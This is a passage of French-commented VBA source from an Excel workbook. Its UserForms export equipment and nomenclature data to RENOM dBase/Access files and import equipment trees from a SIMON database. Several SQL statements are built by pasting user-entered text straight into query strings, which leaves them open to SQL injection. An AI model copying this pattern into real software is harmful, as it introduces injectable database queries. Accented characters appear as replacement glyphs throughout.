                cmb_Doublons.BackColor = vbRed
            Else
                cmb_Doublons.BackColor = vbWhite
                If txtPrj.Text = vbNullString Then
                    txtPrj.BackColor = vbRed
                Else
                    
                    path = lblpath.Caption
                    MkDir path & "\" & txtPrj.Text
                    
                    'Copie la BD et les fichiers dbaseIII
                    If (Application.Version = "15.0") Or (Application.Version = "16.0") Then
                        FileCopy "I:\_dataapplications\" & cmbDossier & "\CONFIG\VERL01_15.MDB", "D:\Public" & "\VERL01.MDB"
                        FileCopy "I:\_dataapplications\" & cmbDossier & "\CONFIG\NOMENCL.DBF", "D:\Public\NOMENCL.DBF"
                        FileCopy "I:\_dataapplications\" & cmbDossier & "\CONFIG\Equipmt.DBF", "D:\Public\Equipmt.DBF"
                        FileCopy "I:\_dataapplications\" & cmbDossier & "\CONFIG\ssen.DBF", "D:\Public\ssen.DBF"
                        FileCopy "I:\_dataapplications\" & cmbDossier & "\CONFIG\SSUNIT.DBF", "D:\Public\SSUNIT.DBF"
                        FileCopy "I:\_dataapplications\" & cmbDossier & "\CONFIG\UNIT.DBF", "D:\Public\UNIT.DBF"
                    Else
                        FileCopy "I:\_dataapplications\" & cmbDossier & "\CONFIG\VERL01_NR.MDB", "D:\Public" & "\VERL01.MDB"
                        FileCopy "I:\_dataapplications\" & cmbDossier & "\CONFIG\NOMENCL.DBF", "D:\Public\NOMENCL.DBF"
    
                    End If
    
                    'Ajouter le nom de Projet dans la BD VERL00
                    
                    Dim cn, cn01 As ADODB.Connection
                    Dim rs, rs01, rsEQUIPMT, rsSSEN, rsNOMENCL As ADODB.Recordset
                    Dim requete, PathDB00, PathDB01 As String
                    Set cn = New ADODB.Connection
                    Set cn01 = New ADODB.Connection
                    Set rs = New ADODB.Recordset
                    Set rs01 = New ADODB.Recordset
                    Dim cmdadd As New ADODB.Command
    
                    cn.Open "Provider=Microsoft.Jet.OLEDB.4.0;" & "Data Source=" & path & "\VERL00.MDB;"
                    cn01.Open "Provider=Microsoft.Jet.OLEDB.4.0;" & "Data Source=" & "D:\Public" & "\VERL01.MDB;"
                    Set cmdadd.ActiveConnection = cn
    
                    requete = "insert into TVRPROJET (repertoire, projet) values ('" & txtPrj.Text & "','" & txtdesc.Text & "')"
                    cn.Execute (requete)
                    
                    'G|fffd|n|fffd|ration des fichiers
                    Dim Msg, Style, Title, Help, Ctxt, Response As String
                    Msg = "Souhaitez-vous continuer?"    ' D|fffd|finit le message.
                    Style = vbYesNo + vbCritical + vbDefaultButton2    ' D|fffd|finit les boutons.
                    Title = "D|fffd|monstration de MsgBox "    ' D|fffd|finit le titre.
                    Help = "DEMO.HLP"    ' D|fffd|finit le fichier d'aide.
                    Ctxt = 1000    ' D|fffd|finit le contexte de
                                ' la rubrique.
                    If ThisWorkbook.Sheets(shEquipmt).Cells(1, 1).Value = "CODE_TN2" Then
                        Msg = "Souhaitez-vous executer la fonction analyse?"    ' D|fffd|finit le message.
                        Style = vbYesNo + vbCritical + vbDefaultButton2    ' D|fffd|finit les boutons.
                        Title = " D|fffd|faut analyse "    ' D|fffd|finit le titre.
                        Help = vbNullString    ' D|fffd|finit le fichier d'aide.
                        Ctxt = 1000    ' D|fffd|finit le contexte de
                                ' la rubrique.
                        Response = MsgBox(Msg, Style, Title, Help, Ctxt)
                
                        If Response = vbYes Then    ' L'utilisateur a choisi Oui.
                            Analyse_Formats_Et_Liens   ' Effectue une action.
                        Else    ' L'utilisateur a choisi Non.
                            Exit Sub
                        End If
                    End If
                    
                    
                    If ThisWorkbook.Sheets(shCde_Nomenclature).Cells(15, 4).Value <> 0 Then MsgCls.ShowMessage "MsgAnomalieLiens", vbNullString, vbNullString, vbNullString, vbOKOnly + vbCritical: Exit Sub
                    
                    equipmt_exp
                    ssen_exp
                                    
                    If frmExportRenom.cmb_Doublons.Text = "OUI" Then
                        ecrit_exp_article_Doublons
                    ElseIf frmExportRenom.cmb_Doublons.Text = "NON" Then
                        ecrit_exp_article
                    End If
                    
                    statut_exp
                    
                    ThisWorkbook.Sheets(shCde_Nomenclature).Cells(28, 2).Value = VBA.Date & " - " & VBA.Time
    
    
                    'Get the last PosCRE
                    Dim VPCRE As String
                    Set rs = New ADODB.Recordset
                    rs.Open "select POSCRE from TVRSYSTEME", cn, adOpenStatic, adLockReadOnly
                    rs.MoveLast
                    VPCRE = rs.Fields(0)
                    lbl_PosCRE.Caption = VPCRE
                    
                    rs.Close
                    Set rs = Nothing
                    
                    'Update PosCRE TVREQUIPMT
                    Dim NbRec, i As Integer
                    Set rsEQUIPMT = New ADODB.Recordset
                    rsEQUIPMT.Open "select * from TVREQUIPMT", cn01, adOpenStatic, adLockReadOnly
                    rsEQUIPMT.MoveLast
                    NbRec = rsEQUIPMT.RecordCount
                    i = 1
                    Do Until i > NbRec + 1
                        requete = "Update TVREQUIPMT set POSCRE=" & VPCRE & " where POSCRE=" & i
                        cn01.Execute (requete)
                        VPCRE = VPCRE + 1
                        i = i + 1
                    Loop
                    rsEQUIPMT.Close
                    Set rsEQUIPMT = Nothing
                    
                    'Update PosCRE TVRSSEN
    
                    Set rsSSEN = New ADODB.Recordset
                    rsSSEN.Open "select * from TVRSSEN", cn01, adOpenStatic, adLockReadOnly
                    rsSSEN.MoveLast
                    NbRec = rsSSEN.RecordCount
                    i = 1
                    Do Until i > NbRec
                        requete = "Update TVRSSEN set POSCRE=" & VPCRE & " where POSCRE=" & i
                        cn01.Execute (requete)
                        VPCRE = VPCRE + 1
                        i = i + 1
                    Loop
                    rsSSEN.Close
                    Set rsSSEN = Nothing
                    
                    'Update Nom_Fournisseur
                    'Set rsEQUIPMT = New ADODB.Recordset
                    'rsEQUIPMT.Open "select NOM_FOUR, INVENTAIRE from TVREQUIPMT", cn01, adOpenStatic, adLockReadOnly
                    'rsEQUIPMT.MoveFirst
                    'NbRec = rsEQUIPMT.RecordCount
                    'For i = 1 To NbRec
                        'NFour = rsEQUIPMT.Fields(0)
                        'Inv = rsEQUIPMT.Fields(1)
                        
                        'requete = "Update TVRSSEN set NOM_FOUR='" & NFour & "' where INVENTAIRE='" & Inv & "'"
                        'cn01.Execute (requete)
                        
                        'rsEQUIPMT.MoveNext
                    'Next i
                    'rsEQUIPMT.Close
                    'Set rsEQUIPMT = Nothing
                    
                    
                    'Update PosCRE TVRNOMENCL
                    
                    Set rsNOMENCL = New ADODB.Recordset
                    rsNOMENCL.Open "select * from TVRNOMENCL", cn01, adOpenStatic, adLockReadOnly
                    rsNOMENCL.MoveLast
                    NbRec = rsNOMENCL.RecordCount
                    i = 1
                    Do Until i > NbRec
                        requete = "Update TVRNOMENCL set POSCRE=" & VPCRE & " where POSCRE=" & i
                        cn01.Execute (requete)
                        VPCRE = VPCRE + 1
                        i = i + 1
                    Loop
                    rsNOMENCL.Close
                    Set rsNOMENCL = Nothing
                    
                    'Update PosCRE TVRSYSTEME
                    requete = "Update TVRSYSTEME set POSCRE=" & VPCRE & vbNullString
                    cn.Execute (requete)
                    
                    'rs.Close
                    'Set rs = Nothing
    
                    cn.Close
                    Set cn = Nothing
                    
                    cn01.Close
                    Set cn01 = Nothing
    
                    'Exporation des fichier dBase
                    
                    'Dim PathDB01 As String
                    PathDB01 = path & "\" & txtPrj.Text
                    DB_LOCATION = "D:\Public" & "\VERL01.MDB"
                    
    
                    
                    If (Application.Version = "15.0") Or (Application.Version = "16.0") Then
                        FileCopy "D:\Public\Equipmt.DBF", PathDB01 & "\Equipmt.DBF"
                        FileCopy "D:\Public\Nomencl.DBF", PathDB01 & "\Nomencl.DBF"
                        FileCopy "D:\Public\ssen.DBF", PathDB01 & "\ssen.DBF"
                        FileCopy "D:\Public\SSUNIT.DBF", PathDB01 & "\SSUNIT.DBF"
                        FileCopy "D:\Public\UNIT.DBF", PathDB01 & "\UNIT.DBF"
                    Else
                        FileCopy "D:\Public\Nomencl.DBF", PathDB01 & "\Nomencl.DBF"
                        Dim acApp As Object
                        Set acApp = New Access.Application
                        
                        acApp.OpenCurrentDatabase (DB_LOCATION)
                        acApp.DoCmd.TransferDatabase acExport, "dBase III", PathDB01, acTable, "TVREQUIPMT", "Equipmt.DBF", False
                        'acApp.DoCmd.TransferDatabase acExport, "dBase III", PathDB01, acTable, "TVRNOMENCL", "Nomencl.DBF", False
                        acApp.DoCmd.TransferDatabase acExport, "dBase III", PathDB01, acTable, "TVRSSEN", "ssen.DBF", False
                        acApp.DoCmd.TransferDatabase acExport, "dBase III", PathDB01, acTable, "TVRSSUNIT", "SSUNIT.DBF", False
                        acApp.DoCmd.TransferDatabase acExport, "dBase III", PathDB01, acTable, "TVRUNIT", "UNIT.DBF", False
                        acApp.Quit
                        Set acApp = Nothing
                    End If
                    
                    MsgBox "L'affaire " & txtdesc & " est bien transfer|fffd|e vers RENOM."
                    
                End If
            End If
        End If
    End If
    
    Exit Sub
    
errGF:
    MsgBox err.Description & " , " & err.Number
    If err.Number = -2147217900 Then
        MsgBox "Merci de supprimer les " & "' .", vbCritical, "Attention des caract|fffd|res sp|fffd|ciaux"
    ElseIf err.Number = 76 Then
        MsgBox "Merci de connecter le lecture I:\", vbCritical, "Probl|fffd|me R|fffd|seau"
    ElseIf err.Number = 53 Then
        MsgBox "Le fichier VERL01_NR.mdb n'existe pas dans le chemain suivant I:\_Dataapplication\" & cmbDossier & vbNullString, vbCritical, "Probl|fffd|me d'acc|fffd|s Chemain/fichier"
    ElseIf err.Number = 70 Then
        MsgBox "le fichier D:\Public\VERL01.mdb est ouvert, Merci de le fermer", vbCritical, "Probl|fffd|me de Permission"
    ElseIf err.Number = 75 Then
        MsgBox "L'affaire est d|fffd|j|fffd| trait|fffd|e.", vbCritical, "Nom d'affaire"
    End If
End Sub

Private Sub cmbDossier_Change()
    Dim fso, ListR, sRep, ListF, Rep, LesReps, fich, LesFichs
    On Error GoTo errGF
    Set fso = CreateObject("Scripting.FileSystemObject")
    Chemin = "I:\_dataapplications"
    'Set ListR = fso.GetFolder(Chemin)
    'Set sRep = ListR.SubFolders
    'Supprimer la liste
    cmbPostes.Clear
    
    'Liste des Postes
    Chemin = "I:\_dataapplications\" & cmbDossier.Text & "\Config"
    Set ListR = fso.getfolder(Chemin)
    Set sRep = ListR.SubFolders
    Set ListF = ListR.Files
    
    For Each Fls In ListF
        If VBA.Len(Fls) > 44 Then If VBA.LCase(Mid(Fls, 38, VBA.Len(Fls) - 44)) = "poste" Then cmbPostes.AddItem (Mid(Fls, 38, VBA.Len(Fls) - 41))
    Next
    Exit Sub
errGF:
    If err.Number = 76 Then
        MsgBox "Merci de connecter le lecture I:\", vbCritical, "Probl|fffd|me R|fffd|seau"
    ElseIf err.Number = 53 Then
        MsgBox "Le fichier VERL01.mdb n'existe pas dans le chemain suivant I:\_Dataapplication\" & cmbDossier & vbNullString, vbCritical, "Probl|fffd|me d'acc|fffd|s Chemain/fichier"
    ElseIf err.Number = 70 Then
        MsgBox "le fichier D:\Public\VERL01.mdb est ouvert, Merci de le fermer", vbCritical, "Probl|fffd|me de Permission"
    ElseIf err.Number = 75 Then
        MsgBox "L'affaire est d|fffd|j|fffd| trait|fffd|e", vbCritical, "Nom d'affaire"
    End If
End Sub

Private Sub cmbPostes_Change()

    Dim Chemin As String
    Chemin = "I:\_dataapplications\" & cmbDossier.Text & "\Config\" & cmbPostes.Text
    Dim NbF As Integer
    Dim strLigne As String
    NbF = FreeFile
    Open Chemin & ".cfg" For Input As NbF
    Do Until EOF(NbF)
        Line Input #NbF, strLigne
        If VBA.Mid(strLigne, 1, 15) = "RepertoireBDNPC" Then Chemin = VBA.Mid(strLigne, 17, VBA.Len(strLigne) - 16)
    Loop
    Close NbF
    
    lblpath.Caption = Chemin

End Sub

Private Sub UserForm_Activate()

    On Error GoTo errGF

    'Remplire de Oui/Non Doublons
    cmb_Doublons.AddItem "OUI"
    cmb_Doublons.AddItem "NON"
    cmb_Doublons.Text = cmb_Doublons.list(0)

'lblNFour.Caption = Worksheets("Affaire").Range("E2").Value
'Remplire de la liste des dossiers RENOM
    Dim fso, ListR, sRep, ListF, Rep, LesReps, fich, LesFichs
    Set fso = CreateObject("Scripting.FileSystemObject")
    Chemin = "I:\_dataapplications"
    Set ListR = fso.getfolder(Chemin)
    Set sRep = ListR.SubFolders
    For Each Rep In sRep
        If VBA.LCase(Mid(Rep, 22, VBA.Len(Rep) - 24)) = "renom" Then cmbDossier.AddItem (Mid(Rep, 22, VBA.Len(Rep) - 21))
    Next
    cmbDossier.Text = cmbDossier.list(0)
    Exit Sub
errGF:
    If err.Number = 76 Then
        MsgBox "Merci de connecter le lecture I:\", vbCritical, "Probl|fffd|me R|fffd|seau"
        frmExportRenom.Hide
    End If
End Sub
Attribute VB_Name = "frmImportSimon"
Attribute VB_Base = "0{33B7906B-CC00-467C-8471-2F3D9AA2AE23}{3309F622-E5D6-47BA-ABAA-C3B8E0DB9B52}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'[---------------------------------------------------------------------------
'[Identifiant   : Formulaire Retour Fournisseur
'[Auteur        : Alain CHERMAT
'[Service       :
'[Date cr|fffd|ation : 25/02/2009
'[Version       : V1.0 du 25/02/2009
'[---------------------------------------------------------------------------
'[Sujet: Formulaire Retour Fournisseur
'[---------------------------------------------------------------------------

Option Explicit


'Pour r|fffd|cup|fffd|rer le handle de l'Userform
Private Declare Function FindWindowA Lib "user32" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long


Private Sub UserForm_Initialize()
    Dim Liste As Variant
    Dim i     As Integer

    Me.Caption = IniCls.ReadStringIniLangage("MsgFWK", "MsgImportSimon")
    Me.lblDivision = IniCls.ReadStringIniLangage("MsgFWK", "MsgSelectDivision")
    Me.lblMetier = IniCls.ReadStringIniLangage("MsgFWK", "MsgSelectMetier")
    Me.lblLigne = IniCls.ReadStringIniLangage("MsgFWK", "MsgSelectLigne")
    Me.lblEquipements = IniCls.ReadStringIniLangage("MsgFWK", "MsgSelectEquip")
    Me.lblSearch = IniCls.ReadStringIniLangage("MsgFWK", "MsgSearchTreeview")
    Me.btnMajIS.Caption = IniCls.ReadStringIniLangage("MsgFWK", "MsgMajIS")
    Me.btnMajIS.Visible = False
    Me.btnOk.Caption = IniCls.ReadStringIniLangage("MsgFWK", "MsgImportEquip")
    Me.btnCancel.Caption = IniCls.ReadStringIniLangage("MsgFWK", "MsgCancel")
    
    'Initialisation de la liste des sites
    With Me.cmbDivisions
        .Clear
        .AddItem
        Liste = Liste_Univers
        For i = 0 To UBound(Liste)
            .AddItem
            .list(.ListCount - 1, 0) = Liste(i)(1)
            .list(.ListCount - 1, 1) = Liste(i)(0)
            .list(.ListCount - 1, 2) = Liste(i)(2)
        Next
        .ListIndex = 0
    End With
    
    FormReSizeable
    UserForm_Resize
End Sub

Private Sub UserForm_Resize()
    Const Marge As Integer = 12
    Const TopTreeView = 132

    On Error GoTo Fin:
    'Exit the sub if we've been minimized
    If Me.InsideWidth = 0 Then Exit Sub

    'Position du Treeview
    With TreeView
        .Top = TopTreeView 'Marge + lblMessage.Height + Marge
        .Left = Marge
        .Width = Application.max(0, Me.InsideWidth - (Marge * 2) - 120)
        'Don't allow the height to go negative
        .Height = Application.max(0, Me.InsideHeight - .Top - Marge)
    End With
    
    'Position du lblSearch
    With lblSearch
        .Top = TopTreeView
        .Left = TreeView.Width + (Marge * 2)
    End With
    
    'Position du TxtSearch
    With TxtSearch
        .Top = TopTreeView + (Marge * 2)
        .Left = TreeView.Width + (Marge * 2)
    End With
    
    'Position du btnSearch
    With btnSearch
        .Top = TxtSearch.Top
        .Left = TxtSearch.Left + TxtSearch.Width + 1 '+ (Marge * 2)
    End With

    'Position du btnCancel
    With btnCancel
        .Top = TreeView.Height + TopTreeView - (Marge * 2)
        .Left = TreeView.Width + (Marge * 2)
    End With
    
    'Position du btnOk
    With btnOk
        .Top = TreeView.Height + TopTreeView - (Marge * 2) - 80
        .Left = TreeView.Width + (Marge * 2)
    End With
    
    'Position du lblCompteur
    With lblCompteur
        .Top = TreeView.Height + TopTreeView - (Marge * 2) - 160
        .Left = TreeView.Width + (Marge * 2)
    End With

Fin:
    On Error GoTo 0
End Sub

Private Sub FormReSizeable()
    Dim MeHwnd As Long
    MeHwnd = FindWindowA(vbNullString, Me.Caption)
    Call FormCls.FormSizeable(MeHwnd)
End Sub

Private Sub btnMajIS_Click()
    Const UrlWeb1 = "http://dbm-ora001.tpz.renault.fr/inf/voir_tables_bases_domaine_chargement.php?domaine=F01-FABRICATION&base="
    Const UrlWeb2 = "&ordre_de_tri_table=2&sens_table=asc&ordre_de_tri_base=BASE&sens_base=asc"
    Dim Univers As String
    
    If Me.cmbDivisions.ListIndex > 0 Then
        Univers = Me.cmbDivisions.list(Me.cmbDivisions.ListIndex, 2)
        ResoudHyperLien UrlWeb1 & Univers & UrlWeb2
    End If
End Sub

Private Sub btnCancel_Click()
    Unload Me
End Sub

Private Sub cmbDivisions_Change()
    Dim Req_Sql     As String
    Dim Univers     As String
    Dim Division    As String
    
    Me.cmbMetiers.Clear
    Me.cmbLignes.Clear
    Me.TreeView.Nodes.Clear 'Efface Tout
    Me.btnSearch.Enabled = False
    Me.btnOk.Enabled = False
    Me.lblCompteur = vbNullString
    
    If Me.cmbDivisions.ListIndex > 0 Then
        Division = Me.cmbDivisions.list(Me.cmbDivisions.ListIndex, 1)
        Univers = Me.cmbDivisions.list(Me.cmbDivisions.ListIndex, 2)
        Req_Sql = "SELECT DISTINCT " & _
                      "MET, " & _
                      "DES_MET " & _
                  "FROM " & _
                      Univers & ".TPT " & _
                  "WHERE " & _
                      "MET <> ' ' " & _
                      "AND DIV_PT = '" & Division & "'"
                      
        'Initialisation de la liste M|fffd|tiers du Site
        With Me.cmbMetiers
            .Clear
            Extraction_IS_SIMON Req_Sql, Me.cmbMetiers, False, vbNullString, vbNullString
            .ListIndex = -1
        End With
        Me.btnMajIS.Visible = True
    End If
End Sub

Private Sub cmbMetiers_Change()
    Dim Req_Sql     As String
    Dim Univers     As String
    Dim Division    As String
    Dim Metier      As String
    
    Me.cmbLignes.Clear
    Me.TreeView.Nodes.Clear 'Efface Tout
    Me.btnSearch.Enabled = False
    Me.btnOk.Enabled = False
    Me.lblCompteur = vbNullString
    If Me.cmbDivisions.ListIndex > 0 And Me.cmbMetiers.ListIndex >= 0 Then
        Division = Me.cmbDivisions.list(Me.cmbDivisions.ListIndex, 1)
        Univers = Me.cmbDivisions.list(Me.cmbDivisions.ListIndex, 2)
        Metier = Me.cmbMetiers.list(Me.cmbMetiers.ListIndex, 1)
        Req_Sql = "SELECT DISTINCT " & _
                      "LIG, " & _
                      "DES_LIG " & _
                  "FROM " & _
                      Univers & ".TPT " & _
                  "WHERE " & _
                      "LIG <> ' ' " & _
                      "AND MET = '" & Metier & "' " & _
                      "AND DIV_PT = '" & Division & "' " & _
                      "AND ((" & Univers & ".TPT.FLAG_SUPPR <> 'X') OR (" & Univers & ".TPT.FLAG_SUPPR IS NULL))"
                      
        'Initialisation de la liste des Lignes de Fab
        With Me.cmbLignes
            .Clear
            Extraction_IS_SIMON Req_Sql, Me.cmbLignes, False, vbNullString, vbNullString
            .ListIndex = -1
        End With
    End If
End Sub

Private Sub cmbLignes_Change()
    Dim Univers     As String
    Dim Division    As String
    Dim Metier      As String
    Dim Ligne       As String
    
    Me.btnSearch.Enabled = False
    Me.TreeView.Nodes.Clear 'Efface Tout
    Me.btnOk.Enabled = False
    If Me.cmbDivisions.ListIndex > 0 And Me.cmbMetiers.ListIndex >= 0 And Me.cmbLignes.ListIndex >= 0 Then
        Division = Me.cmbDivisions.list(Me.cmbDivisions.ListIndex, 1)
        Univers = Me.cmbDivisions.list(Me.cmbDivisions.ListIndex, 2)
        Metier = Me.cmbMetiers.list(Me.cmbMetiers.ListIndex, 1)
        Ligne = Me.cmbLignes.list(Me.cmbLignes.ListIndex, 1)
                      
        Initialisation_Treeview Univers, Division, Metier, Ligne
        Me.btnSearch.Enabled = True
        Me.lblCompteur = 0 & " " & IniCls.ReadStringIniLangage("MsgFWK", "MsgEquipCheck")
    End If
End Sub

Private Sub btnSearch_Click()
    Dim SelectedNode As MSComctlLib.Node
    Dim Deb    As Long
    Dim i      As Long
    
    If VBA.Trim(TxtSearch.Text) = vbNullString Then Exit Sub
    If TreeView.Nodes.Count = 0 Then Exit Sub

    Set SelectedNode = TreeView.SelectedItem

    If SelectedNode Is Nothing Then
        TreeView.Nodes.Item(1).Selected = True
        Set SelectedNode = TreeView.SelectedItem
        Deb = SelectedNode.Index
    Else
        Deb = SelectedNode.Index + 1 'Recherche |fffd| partir de l'item suivant
    End If
    
    For i = Deb To TreeView.Nodes.Count
        If VBA.InStr(VBA.UCase(TreeView.Nodes(i).Text), VBA.UCase(TxtSearch.Text)) Then
            TreeView.Nodes(i).EnsureVisible
            TreeView.Nodes(i).Expanded = True
            TreeView.Nodes(i).Selected = True
            TreeView.SetFocus
            Exit For
        End If
    Next
    If i > TreeView.Nodes.Count Then
        If MsgCls.ShowMessage("MsgEndSearch", vbNullString, vbNullString, vbNullString, vbYesNo + vbQuestion) = vbYes Then
            TreeView.Nodes.Item(1).Selected = True
            btnSearch_Click
        End If
    End If
End Sub

Private Sub Initialisation_Treeview(Univers As String, Division As String, Metier As String, Ligne As String)
    Dim Req_Sql     As String
        
    Set Me.TreeView.ImageList = Me.ImageList1
    
    Me.TreeView.Style = 7 ' 7 avec Images, 6 sans Images
    Me.TreeView.CheckBoxes = True
            
    Req_Sql = "SELECT DISTINCT " & _
        Univers & ".TPT.DIV_PT, " & _
        Univers & ".TPT.DES_DIV, " & _
        Univers & ".TPT.MET, " & _
        Univers & ".TPT.DES_MET, " & _
        Univers & ".TPT.LIG, " & _
        Univers & ".TPT.DES_LIG, " & _
        Univers & ".TPT.EFP, " & _
        Univers & ".TPT.DES_EFP, " & _
        Univers & ".TPT.FP, " & _
        Univers & ".TPT.DES_FP, " & _
        Univers & ".TPT.SFP, " & _
        Univers & ".TPT.DES_SFP, " & _
        Univers & ".TPT.OP, " & _
        Univers & ".TPT.DES_OP, " & _
        Univers & ".TEQT.ID_EQT, " & _
        Univers & ".TEQT.DES_EQT, " & _
        Univers & ".TEQT.NIV, " & _
        Univers & ".TEQT.NOM_FOUR, " & _
        Univers & ".TEQT.REF_FOUR, " & _
        Univers & ".TEQT.NOM_INT, " & _
        Univers & ".TEQT.REF_INT "
    
    Req_Sql = Req_Sql & _
        "FROM " & _
        Univers & ".TPT LEFT OUTER JOIN " & Univers & ".TEQT ON " & Univers & ".TPT.PT = " & Univers & ".TEQT.PT, " & _
        Univers & ".TARBEQ "
         
    'Pas de T|fffd|moin de Suppression et Pos|fffd| sur le Poste Technique
    Req_Sql = Req_Sql & _
        "WHERE " & _
        Univers & ".TARBEQ.ID_EQT = " & Univers & ".TEQT.ID_EQT " & _
        "AND MET = '" & Metier & "' " & _
        "AND DIV_PT = '" & Division & "' " & _
        "AND LIG = '" & Ligne & "' " & _
        "AND ((" & Univers & ".TPT.FLAG_SUPPR <> 'X') OR (" & Univers & ".TPT.FLAG_SUPPR IS NULL)) " & _
        "AND ((" & Univers & ".TEQT.FLAG_SUP <> 'X') OR (" & Univers & ".TEQT.FLAG_SUP IS NULL))" & _
        "AND ((" & Univers & ".TARBEQ.EQT_SUP = '                  ') OR (" & Univers & ".TARBEQ.EQT_SUP IS NULL)) "
'        "AND ((" & Univers & ".TEQT.FLAG_SUP <> 'X') OR (" & Univers & ".TEQT.FLAG_SUP IS NULL))"
'        "AND ((" & Univers & ".TARBEQ.EQT_SUP = '                  ') OR (" & Univers & ".TARBEQ.EQT_SUP IS NULL)) " & _

        Extraction_IS_SIMON Req_Sql, Me.TreeView, False, vbNullString, vbNullString
End Sub

Private Sub TreeView_NodeCheck(ByVal Node As MSComctlLib.Node)
    PropagateChecks Node
    Comptage_Equipement
End Sub

Private Sub PropagateChecks(ByVal ParentNode As MSComctlLib.Node)
    Dim oNode As MSComctlLib.Node
    Dim lNodeIndex As Long
    
    If ParentNode.Children > 0 Then
        Set oNode = ParentNode.child
        oNode.Checked = ParentNode.Checked
        Call PropagateChecks(oNode)
        For lNodeIndex = 1 To ParentNode.Children - 1
            Set oNode = oNode.Next
            oNode.Checked = ParentNode.Checked
            Call PropagateChecks(oNode)
        Next
    End If
    Set oNode = Nothing
End Sub

'Compter le nombre d'|fffd|quipements coch|fffd|s dans le TreeView
Private Sub Comptage_Equipement()
    Dim nodX As Node
    Dim Nb As Integer
    
    Nb = 0
    For Each nodX In TreeView.Nodes
        If nodX.Checked = True And VBA.Left(nodX.Key, 2) = "Q_" Then
            Nb = Nb + 1
        End If
    Next
    Me.lblCompteur = Nb & " " & IniCls.ReadStringIniLangage("MsgFWK", "MsgEquipCheck")
    Me.btnOk.Enabled = Nb > 0
End Sub

Private Sub btnOk_Click()
    If Not TDI_Vide Then
        If MsgCls.ShowMessage("MsgPurger_TDI", vbNullString, vbNullString, vbNullString, vbYesNo + vbQuestion) <> vbYes Then Exit Sub
    End If

    Extraction_SAP_SIMON
End Sub




Attribute VB_Name = "frmImportXelec"
Attribute VB_Base = "0{1A9532E5-E297-4E17-AFF8-DFA07478701E}{3DD8D2E0-60DC-48B7-8F88-1A4344957FDF}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False

Option Explicit

'[---------------------------------------------------------------------------
'[Identifiant   : Formulaire d'Import de donn|fffd|es XElec
'[Auteur        : Alain CHERMAT
'[Service       :
'[Date cr|fffd|ation : 30/09/2008
'[Version       : V1.0 du 30/09/2008
'[---------------------------------------------------------------------------
'[Sujet: Formulaire d'Import de donn|fffd|es XElec
'[---------------------------------------------------------------------------


Private Sub UserForm_Initialize() 'Private Sub Form_Load()
    Dim num_ssen As String
    
    num_ssen = VBA.UCase(Trim(Worksheets(ShAffaire).Range("Champ_Num_Mabec").Value))
    
    Me.Caption = IniCls.ReadStringIniLangage("MsgFWK", "MsgImportXelec")
    Me.lblProcedure = IniCls.ReadStringIniLangage("MsgFWK", "MsgProcXelec1") & vbCrLf & _
                      IniCls.ReadStringIniLangage("MsgFWK", "MsgProcXelec2") & " : " & num_ssen & vbCrLf & _
                      IniCls.ReadStringIniLangage("MsgFWK", "MsgProcXelec3") & vbCrLf & _
                      IniCls.ReadStringIniLangage("MsgFWK", "MsgProcXelec4") & vbCrLf & _
                      IniCls.ReadStringIniLangage("MsgFWK", "MsgProcXelec5")
    Me.lblInfoPurge = IniCls.ReadStringIniLangage("MsgFWK", "MsgPurgeXelec")
    Me.optPurge = IniCls.ReadStringIniLangage("MsgFWK", "MsgClearXelec")
    Me.optRajout = IniCls.ReadStringIniLangage("MsgFWK", "MsgRajoutXelec")
    
    Me.cmdImport.Caption = "1 - " & IniCls.ReadStringIniLangage("MsgFWK", "MsgcmdImport1")
    
    Me.cmdSousEnsembles.Caption = "2 - " & _
                      IniCls.ReadStringIniLangage("MsgFWK", "MsgcmdImport2") & vbCrLf & _
                      IniCls.ReadStringIniLangage("MsgFWK", "MsgcmdImport3")
                      
    Me.cmdEnsembles.Caption = "3 - " & _
                      IniCls.ReadStringIniLangage("MsgFWK", "MsgcmdImport2") & vbCrLf & _
                      IniCls.ReadStringIniLangage("MsgFWK", "MsgcmdImport4") & vbCrLf & _
                      IniCls.ReadStringIniLangage("MsgFWK", "MsgcmdImport5")
                       
    Me.lblNota = IniCls.ReadStringIniLangage("MsgFWK", "MsgcmdImport6")

    Me.frmResume.Caption = IniCls.ReadStringIniLangage("MsgFWK", "MsgResumeXelec")
    Me.lblNbLignes = IniCls.ReadStringIniLangage("MsgFWK", "MsgLignesXelec")
    Me.lblDesign = IniCls.ReadStringIniLangage("MsgFWK", "MsgDesigXelec")
    Me.lblReferences = IniCls.ReadStringIniLangage("MsgFWK", "MsgRefXelec")
    Me.lblNomFour = IniCls.ReadStringIniLangage("MsgFWK", "MsgFourXelec")
    Me.cmdClose.Caption = IniCls.ReadStringIniLangage("MsgFWK", "MsgClose")
    
    If Lastline(ThisWorkbook.Worksheets(shMateriels)) > FirstLine(shMateriels) Then
        Me.lblInfoPurge.Visible = True
        Me.optPurge.Visible = True
        Me.optRajout.Visible = True
        Me.optPurge.Value = False
        Me.optRajout.Value = False
        
        Me.cmdImport.Enabled = False
        Me.cmdSousEnsembles.Enabled = False
        Me.cmdEnsembles.Enabled = False
    Else
        Me.lblInfoPurge.Visible = False
        Me.optPurge.Visible = False
        Me.optRajout.Visible = False
        Me.optPurge.Value = True
        Me.optRajout.Value = False
        
        Me.cmdImport.Enabled = True
        Me.cmdSousEnsembles.Enabled = True
        Me.cmdEnsembles.Enabled = True
    End If
     
    Me.lblFinImport.Visible = False
End Sub


Private Sub optPurge_Click()
    Me.cmdImport.Enabled = True
    Me.cmdSousEnsembles.Enabled = True
    Me.cmdEnsembles.Enabled = True
End Sub


Private Sub optRajout_Click()
    Me.cmdImport.Enabled = True
    Me.cmdSousEnsembles.Enabled = True
    Me.cmdEnsembles.Enabled = True
End Sub


Private Sub cmdClose_Click()
    Unload Me
End Sub


Private Sub cmdImport_Click()
    'Import Sans Regroupement
    Import_Nomenclature_Xelec 0
End Sub


Private Sub cmdSousEnsembles_Click()
    Import_Nomenclature_Xelec 1
End Sub

Private Sub cmdEnsembles_Click()
    Import_Nomenclature_Xelec 2
End Sub
Attribute VB_Name = "frmLogin"
Attribute VB_Base = "0{5684EC50-DB03-4DB0-B13A-BF31C8D2BA56}{A87967AA-7B42-47C5-AE87-3A4C4F79263D}"
Attribute VB_GlobalNameSpace = False
